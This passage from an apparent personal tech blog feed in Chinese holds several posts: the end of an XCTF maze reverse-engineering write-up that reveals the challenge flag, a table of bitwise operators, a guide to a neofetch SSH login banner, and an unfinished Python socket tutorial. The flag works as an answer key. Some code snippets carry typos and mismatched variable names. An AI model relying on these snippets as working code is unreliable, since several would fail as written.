<code>nctf{******************}</code></p></li><li><p>输入的字符串中的字符如满足：（以下的位置移动相对于上述的正方形图案）</p><p>&gt; 78：== 79(‘O’) 则变量 <code>&amp;v10 + 4</code>  减 1，相当于组内下标向左移动 1 位；== 111(‘o’)，则变量 <code>&amp;v10 + 4</code> 加 1，相当于组内下标向右移动 1 位；</p><p>≤ 78：== 46(’.’) 则变量 <code>&amp;v10</code> 减 1，相当于组间下标向上移动 1 位；== 48(‘0’)，则变量 <code>&amp;v10</code>  加 1，相当于组间下标向下移动 1 位；</p><p>概括为：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;             ↑</span><br><span class="line">&gt;            (.)</span><br><span class="line">&gt;   ← (O) ▪ (o) →</span><br><span class="line">&gt;      (0)</span><br><span class="line">&gt;       ↓</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="2-问题抽取-2"><a class="markdownIt-Anchor" href="#2-问题抽取-2"></a> 2) 问题抽取</h4><blockquote><p>根据上文，得出问题：要在 18 步内从左上角走到位置为 (4, 4) 的 “#” 符号，换句话说在 18 步内要使得 <code>(int8)(&amp;v10+4)</code> 和 <code>v10</code> 的值都为 4，其中起点为左上角的 (0, 0)，在行走的每一步中都不能碰到 “*” 字符。</p></blockquote><h3 id="3-走出迷宫"><a class="markdownIt-Anchor" href="#3-走出迷宫"></a> 3. 走出迷宫</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">◾ → * * * * * *</span><br><span class="line">* ↓ → → *     *</span><br><span class="line">* * * ↓ *   * *</span><br><span class="line">* * ← ↓ *   * *</span><br><span class="line">*   ↓ * ← ← ↑ *</span><br><span class="line">* * ↓ * * * ↑ *</span><br><span class="line">* * ↓ → → → → *</span><br><span class="line">* * * * * * * *</span><br></pre></td></tr></table></figure><p>则对应的字母为：<code>o0oo00O000oooo..OO</code>，那么 flag 为 <code>nctf{o0oo00O000oooo..OO}</code> 。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-代码审计&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-代码审计&quot;&gt;&lt;/a&gt; 1. 代码审计&lt;/h3&gt;
&lt;h4 id=&quot;1-输入部分&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-输入部分&quot;&gt;&lt;/
      
    
    </summary>
    
    
      <category term="xctf" scheme="https://muzibing.github.io/tags/xctf/"/>
    
  </entry>
  
  <entry>
    <title>逻辑和位运算符的“歪门邪道”</title>
    <link href="https://muzibing.github.io/2020/11/02/2020.11.02%EF%BC%88156%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/11/02/2020.11.02（156）/</id>
    <published>2020-11-01T16:00:00.000Z</published>
    <updated>2020-11-17T06:01:33.112Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><table><thead><tr><th>运算符</th><th>类别</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>!</td><td>逻辑运算符</td><td>称为逻辑非运算符。用来逆转操作数的逻辑状态。<br>如果条件为真则逻辑非运算符将使其为假。</td><td>!(A &amp;&amp; B) 为真。</td></tr><tr><td>&amp;</td><td></td><td>按位与操作，按二进制位进行&quot;与&quot;运算</td><td></td></tr><tr><td>|</td><td></td><td>按位或运算符，按二进制位进行&quot;或&quot;运算</td><td></td></tr><tr><td>^</td><td></td><td>异或运算符，按二进制位进行&quot;异或&quot;运算</td><td></td></tr><tr><td>~</td><td></td><td>取反运算符，按二进制位进行&quot;取反&quot;运算</td><td></td></tr><tr><td>&lt;&lt;</td><td></td><td>二进制左移运算符。<br>将一个运算对象的各二进制位全部左移若干位<br>（左边的二进制位丢弃，右边补0）</td><td></td></tr><tr><td>&gt;&gt;</td><td></td><td>二进制右移运算符。<br>将一个数的各二进制位全部右移若干位，<br>正数左补0，负数左补1，右边丢弃</td><td></td></tr></tbody></table><h3 id><a class="markdownIt-Anchor" href="#"></a> </h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;基础知识&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础知识&quot;&gt;&lt;/a&gt; 基础知识&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;运算符&lt;/th&gt;
&lt;th&gt;类别&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;th&gt;示例&lt;/th&gt;
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>服务器 SSH 登录界面配置（Neofetch）</title>
    <link href="https://muzibing.github.io/2020/10/18/2020.10.18%EF%BC%88155%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/10/18/2020.10.18（155）/</id>
    <published>2020-10-17T16:00:00.000Z</published>
    <updated>2020-11-02T10:56:52.828Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="一、相"><a href="#一、相" class="headerlink" title="一、相"></a><font color="navy">一、相</font></h3><h3 id="关知识点-lt-font-gt"><a href="#关知识点-lt-font-gt" class="headerlink" title="关知识点&lt;/font&gt;"></a>关知识点&lt;/font&gt;</h3><h4 id="1-Login-过程"><a href="#1-Login-过程" class="headerlink" title="1.Login 过程"></a><code>1.Login 过程</code></h4><blockquote><p><code>login</code> 程序成功后，会向对应的终端在输出最近一次登录的信息(在<code>/var/log/lastlog</code>中有记录)，并检查用户是否有新邮件(在<code>/usr/spool /mail/</code>的对应用户名目录下)。然后开始设置各种环境变量：对于<code>bash</code>来说，系统首先寻找<code>/etc/profile</code>脚本文件，并执行他；然后如果用户的主目录中存在<code>.bash_profile</code>文件，就执行他，在这些文件中又可能调用了其他设置文件，所有的设置文件执行后后，各种环境变量也设好了，这时会出现大家熟悉的命令行提示符，到此整个启动过程就结束了。</p></blockquote><h4 id="2-etc-profile-文件"><a href="#2-etc-profile-文件" class="headerlink" title="2./etc/profile 文件"></a><code>2./etc/profile 文件</code></h4><p>profile（<code>/etc/profile</code>），用于设置系统级的环境变量和启动程序，在这个文件下配置会对所有用户生效。当用户登录（login）时，文件会被执行，并从<code>/etc/profile.d</code>目录的配置文件中查找shell设置。</p><p>一般不建议在<code>/etc/profile</code>文件中添加环境变量，因为在这个文件中添加的设置会对所有用户起作用。当必须添加时，我们可以按以下方式添加：如，添加一个HOST值为muzi.com的环境变量：export HOST=muzi.com 添加时，可以在行尾使用;号，也可以不使用。一个变量名可以对应多个变量值，多个变量值需要使用:进行分隔。添加环境变量后，需要重新登录才能生效，也可以使用source命令强制立即生效：source /etc/profile 查看是否生效可以使用echo命令：<code>echo $HOST muzi.com</code>。</p><h4 id="3-etc-profile-d-文件夹"><a href="#3-etc-profile-d-文件夹" class="headerlink" title="3./etc/profile.d 文件夹"></a><code>3./etc/profile.d 文件夹</code></h4><blockquote><ol><li><code>/etc/profile</code>和<code>/etc/profile.d</code> 两个文件都是设置环境变量文件的，/etc/profile是永久性的环境变量,是全局变量，<code>/etc/profile.d/</code>设置所有   用户生效</li><li><code>/etc/profile.d/</code>比<code>/etc/profile</code>好维护，不想要什么变量，直接删除<code>/etc/profile.d/</code>下对应的shell脚本即可，不用    像<code>/etc/profile</code>需要改动此文件</li></ol></blockquote><p><strong>Linux 中每个用户都要指定各自的环境变量，这样会比较麻烦，那么如何配置一个环境变量，所有的用户都可以使用呢？</strong></p><blockquote><p>下面以neofetch的安装为例</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/profile.d/java.sh</span><br></pre></td></tr></table></figure><p> 在新的java .sh中输入以下内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#set java environment</span></span><br><span class="line">JAVA_HOME=/var/mysoft/jdk1.7.0_80</span><br><span class="line">PATH=＄JAVA_HOME/bin:＄PATH</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME PATH</span><br></pre></td></tr></table></figure><p> 保存退出，然后给java.sh分配权限：<code>chmod 755 /etc/profile.d/java.sh</code></p><h4 id="4-config-文件夹"><a href="#4-config-文件夹" class="headerlink" title="4.~/.config 文件夹"></a><code>4.~/.config 文件夹</code></h4><h4 id="5-bashrc-文件"><a href="#5-bashrc-文件" class="headerlink" title="5.~/.bashrc 文件"></a><code>5.~/.bashrc 文件</code></h4><p>bashrc文件用于配置函数或别名。bashrc文件有两种级别：</p><ul><li><p>系统级的位于/etc/bashrc</p></li><li><p>用户级的位于~/.bashrc</p></li></ul><p>两者分别会对所有用户和当前用户生效。bashrc文件只会对指定的shell类型起作用，bashrc只会被bash shell调用。</p><h4 id="6-bash-profile"><a href="#6-bash-profile" class="headerlink" title="6.~/.bash_profile"></a><code>6.~/.bash_profile</code></h4><p><code>bash_profile</code>只对单一用户有效，文件存储位于<code>~/.bash_profile</code>，该文件是一个用户级的设置，可以理解为某一个用户的<code>profile</code>目录下。这个文件同样也可以用于配置环境变量和启动程序，但只针对单个用户有效。和<code>profile</code>文件类似，<code>bash_profile</code>也会在用户登录（login）时生效，也可以用于设置环境变理。但与<code>profile</code>不同，<code>bash_profile</code>只会对当前用户生效。</p><p>这三种文件类型的差异用一句话表述就是：</p><ul><li><code>/etc/profile</code>、<code>/etc/bashrc</code> 是系统全局环境变量设定；</li><li><code>~/.profile</code>，<code>~/.bashrc</code>用户家目录下的私有环境变量设定。</li></ul><p>当登入系统时候获得一个shell进程时，其读取环境设定档如下：</p><ol><li>首先读入的是全局环境变量设定档<code>/etc/profile</code>，然后根据其内容读取额外的设定的文档，如<code>/etc/profile.d</code>和<code>/etc/inputrc</code></li><li>然后根据不同使用者帐号，去其<code>home</code>目录读取<code>~/.bash_profile</code>，如果这读取不了就读取<code>~/.bash_login</code>，这个也读取不了才会读取<code>~/.profile</code>，这三个文档设定基本上是一样的, 读取有优先关系.</li><li>然后在根据用户帐号读取<code>~/.bashrc</code></li></ol><p><strong>关于各个文件的作用域，在网上找到了以下说明：</strong></p><blockquote><p>（1） <strong>/etc/profile：</strong> 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行. 并从/etc/profile.d目录的配置文件中搜集shell的设置；</p><p>（2） <strong>/etc/bashrc:</strong> 为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取（即每次新开一个终端，都会执行bashrc）；</p><p>（3） <strong>~/.bash_profile:</strong> 每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次。默认情况下,设置一些环境变量,执行用户的.bashrc文件；</p><p>（4） <strong>~/.bashrc:</strong> 该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取；</p><p>（5） <strong>~/.bash_logout:</strong> 当每次退出系统(退出bash shell)时,执行该文件. 另外,/etc/profile中设定的变量(全局)的可以作用于任何用户,而~/.bashrc等中设定的变量(局部)只能继承 /etc/profile中的变量,他们是”父子”关系；</p><p>（6） <strong>~/.bash_profile:</strong> 是交互式、login 方式进入 bash 运行的~/.bashrc 是交互式 non-login 方式进入 bash 运行的通常二者设置大致相同，所以通常前者会调用后者。</p></blockquote><h3 id="二、配置过程"><a href="#二、配置过程" class="headerlink" title="二、配置过程"></a><font color="navy">二、配置过程</font></h3><h4 id="1-安装Neofetch"><a href="#1-安装Neofetch" class="headerlink" title="1.安装Neofetch"></a><code>1.安装Neofetch</code></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install neofetch</span><br></pre></td></tr></table></figure><p>安装结束以后，neofetch会默认创建一个<code>$HOME/.config/neofetch/config.conf</code>文件，该文件包含了显示内容的基本内容，文件中的内容如下：</p><blockquote><ol><li>Title：是本机的域名；</li><li>Kernel：显示内核的相关信息；</li><li>Distro：显示系统的体系架构的相关信息；</li><li>Uptime：显示上次更新的时间；</li><li>Memory：显示内存占用情况；</li><li>Shell：显示shell的路径信息；</li><li>CPU：显示CPU的速度、型号和内核等相关信息；</li><li>GPU：显示GPU的相关信息；</li><li>IP：Website to ping for the public IP；</li><li>Disk：展示磁盘运行相关信息；</li><li>……</li></ol></blockquote><p>配置相关的信息如下：</p><blockquote><ol><li>Text <ul><li><code>Text Colors</code>：配置服务器显示信息（上述信息）文字的颜色，colors=(7 7 5 11 7 9)；</li><li><code>Toggle bold text</code>：文字是否加粗；</li><li><code>Enable/Disable Underline</code>：是否有下划线；</li><li><code>Underline character</code>：字符是否有下划线；</li></ul></li><li><code>Progress Bars</code>：是否以进度条的形式展示，主要针对CPU，memory、battery、disk<ul><li><code>Bar characters</code>：bar_char_elapsed（使用过的）=”=”；bar_char_total（总的进度条）=”-；</li><li><code>Progress bar length in spaces</code>：进度条的长度，默认是15；</li><li><code>Progress bar colors</code>：进度条的颜色：bar_color_elapsed=”1”； bar_color_total=”2”；</li><li><code>Info display</code>：进度条显示信息的样式，如：disk_display=”infobar”</li></ul></li><li><code>Backend Settings</code>：后端设定，主要是针对左侧的显示的图片进行设置<ul><li><code>Image backend</code>：支持的格式有ascii、caca、chafa、jp2a、iterm2、off、termpix、picterm、tycat、w3m和kitty</li><li><code>Image Source</code>：显示的图片路径</li><li><code>Ascii Options</code>：上述ASCII码的配置信息<ul><li><code>Ascii Colors</code>：ASCII码的颜色，如ascii_colors=(4 6 1 8 8 6)；</li><li><code>Bold ascii logo</code>：ASCII码文字是否加粗</li></ul></li><li>Image Options<ul><li><code>Image loop</code>：将此设置为开将使neofetch不断重绘图像，直到按Ctrl + C为止。 这修复了某些终端仿真器中的显示问题。</li><li><code>Thumbnail directory</code>：缩略图目录</li><li><code>Crop mode</code>：裁切模式，包括normal、fit和fill，具体的请<a href="https://github.com/dylanaraps/neofetch/wiki/What-is-Waifu-Crop%3F" target="_blank" rel="noopener">参照官网</a></li><li><code>Crop offset</code>：裁切的偏移，有’northwest’, ‘north’, ‘northeast’, ‘west’, ‘center’,’east’, ‘southwest’, ‘south’, ‘southeast’</li><li><code>Image size</code>：图片的大小</li><li><code>Gap between image and text</code>：图片和信息之间的间距</li></ul></li></ul></li></ol></blockquote><h4 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a><code>2.配置文件</code></h4><p>①  <code>增加/etc/profile.d/neofetch</code></p><p>因为Linux在开机启动，对于<code>bash</code>来说，系统首先寻找<code>/etc/profile</code>脚本文件，并执行它，而<code>/etc/profile</code>脚本会遍历并执行<code>/etc/profile.d</code>目录下的所有<code>.sh</code>文件，所以我们需要增加一个文件或者在其他文件中增加命令（推荐前者方法），那么就需要在<code>/etc/profile.d</code>目录下增加一个<code>neofetch.sh</code>文件，文件内容如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/bin/bash</span></span><br><span class="line">neofetch</span><br></pre></td></tr></table></figure><p>② <code>增减 ~/.config/neofetch/ascii-name</code></p><p>增加这个文件，是因为如果<code>~/.config.neofetch/config.conf</code>文件中的<code>images_backend</code>设置为”ascii”，那么就需要将<code>image_source</code>的选项设置为<code>image_source=&quot;/root/.config/neofetch/ascii-name&quot;</code>；</p><p>在这里和大家分享几个ASCII在线制作的网站：</p><ul><li><a href="http://patorjk.com/software/taag/#p=display&amp;f=Graffiti&amp;t=Type%20Something" target="_blank" rel="noopener">Text to ASCII Art Generator (TAAG)</a></li><li><a href="http://www.makepic.net/Tool/Image2ascii.html" target="_blank" rel="noopener">在线图片转ASCII码(图片转字符串)工具—制图网</a></li><li><a href="http://asciiflow.com/" target="_blank" rel="noopener">ASCIIFlow Infinity</a></li><li><a href="http://life.chacuo.net/convertphoto2char" target="_blank" rel="noopener">在线图片转字符</a></li><li><a href="http://www.asciiworld.com/" target="_blank" rel="noopener">Asciiworld.com : Pictures of Ascii Art !</a></li></ul><p>③ <code>配置 /etc/motd 文件</code></p><p>里面是ssh的登录配置界面</p><h4 id="3-配置结果"><a href="#3-配置结果" class="headerlink" title="3.配置结果"></a><code>3.配置结果</code></h4><p>下面给出我的ssh登陆界面：</p><p><img src="/images/155-1.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;一、相&quot;&gt;&lt;a href=&quot;#一、相&quot; class=&quot;headerlink&quot; title=&quot;一、相&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;一、相&lt;/font&gt;&lt;/h3&gt;&lt;h3 id=&quot;关知识点-lt-font-gt&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://muzibing.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Python3 网络编程</title>
    <link href="https://muzibing.github.io/2020/09/27/2020.09.27%EF%BC%88154%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/27/2020.09.27（154）/</id>
    <published>2020-09-26T16:00:00.000Z</published>
    <updated>2020-09-28T09:19:52.207Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是socket"><a class="markdownIt-Anchor" href="#0x00-什么是socket"></a> 0x00 什么是Socket？</h2><h3 id="1简介"><a class="markdownIt-Anchor" href="#1简介"></a> 1.简介</h3><blockquote><p>socket起源于Unix，而Unix/Linux基本哲学之一就是“一切皆文件”，对于文件用“打开—读/写—关闭&quot;模式来操作。socket就是该模式的一个实现，socket即是一种特殊的文件，一些socket函数就是对其进行的操作（读/写IO、打开、关闭）</p><p>基本上，Socket 是任何一种计算机网络通讯中最基础的内容。例如当你在浏览器地址栏中输入 <a href="http://www.cnblogs.com/" target="_blank" rel="noopener">http://www.cnblogs.com/</a> 时，你会打开一个套接字，然后连接到 <a href="http://www.cnblogs.com/" target="_blank" rel="noopener">http://www.cnblogs.com/</a> 并读取响应的页面然后然后显示出来。而其他一些聊天客户端如 gtalk 和 skype 也是类似。任何网络通讯都是通过 Socket 来完成的。</p></blockquote><h3 id="2socket通信流程"><a class="markdownIt-Anchor" href="#2socket通信流程"></a> 2.socket通信流程</h3><p><img src="/images/154-1.jpg" alt></p><p><font color="red"><strong>服务器</strong></font>：根据地址类型（ipv4,ipv6）、socket类型、协议创建socket</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br></pre></td></tr></table></figure><p><font color="red"><strong>服务器</strong></font>：为socket绑定ip地址和端口号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpserSock.bind((HOST, PORT))</span><br></pre></td></tr></table></figure><blockquote><p>s.bind(address) 将套接字绑定到地址。address地址的格式取决于地址族。在AF_INET下，以元组（host,port）的形式表示地址。</p></blockquote><p><font color="red"><strong>服务器</strong></font>：socket监听端口号请求，随时准备接收客户端发来的连接，这时候服务器的socket并没有被打开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpserSock.listen(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><blockquote><p>开始监听传入连接。backlog指定在拒绝连接之前，可以挂起的最大连接数量。backlog等于5，表示内核已经接到了连接请求，但服务器还没有调用accept进行处理的连接个数最大为5，这个值不能无限大，因为要在内核中维护连接队列</p></blockquote><p><font color="blue"><strong>客户端</strong></font>：创建socket</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpcliSock = socket(AF_INET, SOCK_STREAM)</span><br></pre></td></tr></table></figure><p><font color="blue"><strong>客户端</strong></font>：打开socket，根据服务器ip地址和端口号试图连接服务器socket</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpcliSock.connect((HOST, ADDR))</span><br></pre></td></tr></table></figure><blockquote><p>连接到address处的套接字。一般，address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</p></blockquote><p><font color="red"><strong>服务器</strong></font>：socket接收到客户端socket请求，被动打开，开始接收客户端请求，直到客户端返回连接信息。这时候socket进入<strong>阻塞</strong>状态，所谓阻塞即accept()方法一直到客户端返回连接信息后才返回，开始接收下一个客户端谅解请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpCliSocki, addr = tcpserSocket.accept()</span><br></pre></td></tr></table></figure><p><font color="blue"><strong>客户端</strong></font>：连接成功，向服务器发送连接状态信息</p><p><font color="red"><strong>服务器</strong></font>：accept方法返回，连接成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpCliSocki, addr = tcpserSocket.accept()</span><br></pre></td></tr></table></figure><blockquote><p>接受连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。接收TCP 客户的连接（阻塞式）等待连接的到来</p></blockquote><p><font color="blue"><strong>客户端</strong></font>：向socket写入信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpcliSocket.send(data)</span><br></pre></td></tr></table></figure><blockquote><p>将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。即：可能未将指定内容全部发送。</p></blockquote><p><font color="red"><strong>服务器</strong></font>：读取信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ecpserSocket.recv(bufsize)</span><br></pre></td></tr></table></figure><blockquote><p>接受套接字的数据。数据以字符串形式返回，bufsize指定<strong>最多</strong>可以接收的数量。flag提供有关消息的其他信息，通常可以忽略.1024 是缓冲区数据大小限制最大值参数 <code>bufsize</code>，并不是说 <code>recv()</code> 方法只返回 1024个字节的内容</p></blockquote><p><font color="blue"><strong>客户端</strong></font>：关闭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpcliSocket.close()</span><br></pre></td></tr></table></figure><p><font color="red"><strong>服务器</strong></font>：关闭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpserSocket.close()</span><br></pre></td></tr></table></figure><h2 id="0x01-socket模块"><a class="markdownIt-Anchor" href="#0x01-socket模块"></a> 0x01 Socket模块</h2><p>首先创建一个TCP Socket</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br></pre></td></tr></table></figure><table><thead><tr><th>socket类型</th><th>描述</th></tr></thead><tbody><tr><td>socket.AF_UNIX</td><td>用于同一台机器上的进程通信（既本机通信）</td></tr><tr><td>socket.AF_INET</td><td>用于服务器与服务器之间的网络通信(指定使用IPv4)</td></tr><tr><td>socket.AF_INET6</td><td>基于IPV6方式的服务器与服务器之间的网络通信</td></tr><tr><td>socket.SOCK_STREAM</td><td>基于TCP的流式socket通信</td></tr><tr><td>socket.SOCK_DGRAM</td><td>基于UDP的数据报式socket通信</td></tr><tr><td>socket.SOCK_RAW</td><td>原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次SOCK_RAW也可以处理特殊的IPV4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头</td></tr><tr><td>socket.SOCK_SEQPACKET</td><td>可靠的连续数据包服务</td></tr></tbody></table><h4 id="1服务器端"><a class="markdownIt-Anchor" href="#1服务器端"></a> 1.服务器端</h4><p><code>s.bind(address)</code></p><blockquote><p>将套接字绑定到地址。address地址的格式取决于地址族。在AF_INET下，以元组（host,port）的形式表示地址。</p></blockquote><p><code>s.listen(backlog)</code></p><blockquote><p>开始监听传入连接。backlog指定在拒绝连接之前，可以挂起的最大连接数量。</p></blockquote><p><code>s.setblocking(bool)</code></p><blockquote><p>是否阻塞（默认True），如果设置False，那么accept和recv时一旦无数据，则报错。</p></blockquote><p><code>s.accept()</code></p><blockquote><p>接受连接并返回（conn, address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。 接收TCP 客户的连接（阻塞式）等待连接的到来.</p><p>这里必须要明白我们通过调用 <code>accept()</code> 方法拥有了一个新的 socket 对象。这非常重要，因为你将用这个 socket 对象和客户端进行通信。和监听一个 socket 不同的是后者只用来授受新的连接请求</p></blockquote><h3 id="2客户端"><a class="markdownIt-Anchor" href="#2客户端"></a> 2.客户端</h3><p><code>s.connect(address)</code></p><blockquote><p>连接到address处的套接字。一般，address的格式为元组（hostname,port）,如果连接出错，返回socket.error错误。</p></blockquote><p><code>s.connect_ex(address)</code></p><blockquote><p>同上，只不过会有返回值，连接成功时返回 0 ，连接失败时候返回编码，例如：10061</p></blockquote><h3 id="3公共socket的方法"><a class="markdownIt-Anchor" href="#3公共socket的方法"></a> 3.公共Socket的方法</h3><p><code>s.close()</code></p><blockquote><p>关闭套接字 s.recv(bufsize[,flag]) 　接受套接字的数据。数据以字符串形式返回，bufsize指定最多可以接收的数量。flag提供有关消息的其他信息，通常可以忽略。</p></blockquote><p><code>s.recvfrom(bufsize[.flag])</code></p><blockquote><p>与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</p></blockquote><p><code>s.send(string[,flag])</code></p><blockquote><p>将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。即：可能未将指定内容全部发送。</p></blockquote><p><code>s.sendall(string[,flag])</code></p><blockquote><p>将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。内部通过递归调用send，将所有内容发送出去。</p></blockquote><p><code>s.sendto(string[,flag],address)</code></p><blockquote><p>将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。该函数主要用于UDP协议。</p></blockquote><p><code>s.settimeout(timeout)</code></p><blockquote><p>设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如 client 连接最多等待5s ）</p></blockquote><p><code>s.getpeername()</code></p><blockquote><p>返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</p></blockquote><p><code>s.getsockname()</code></p><blockquote><p>返回套接字自己的地址。通常是一个元组(ipaddr,port)</p></blockquote><p><code>s.fileno()</code></p><blockquote><p>套接字的文件描述符</p></blockquote><p><code>s.setblocking(flag)</code></p><blockquote><p>如果flag为0，则将套接字设置为非阻塞模式，否则将套接字设置为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数  据，或send()调用无法立即发送数据，那么将引起socket.error异常。</p></blockquote><h2 id="0x02-实现"><a class="markdownIt-Anchor" href="#0x02-实现"></a> 0x02 实现</h2><h3 id="1简易聊天软件"><a class="markdownIt-Anchor" href="#1简易聊天软件"></a> 1.简易聊天软件</h3><p><code>客户端</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"192.168.126.131"</span></span><br><span class="line">PORT = <span class="number">1234</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,tcp)</span>:</span></span><br><span class="line">        self.tcp = tcp</span><br><span class="line">        self.tcp.connect((HOST, PORT))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sendData</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            data = input(<span class="string">"&gt; "</span>)</span><br><span class="line">            self.tcp.sendall(data.encode())</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recvData</span><span 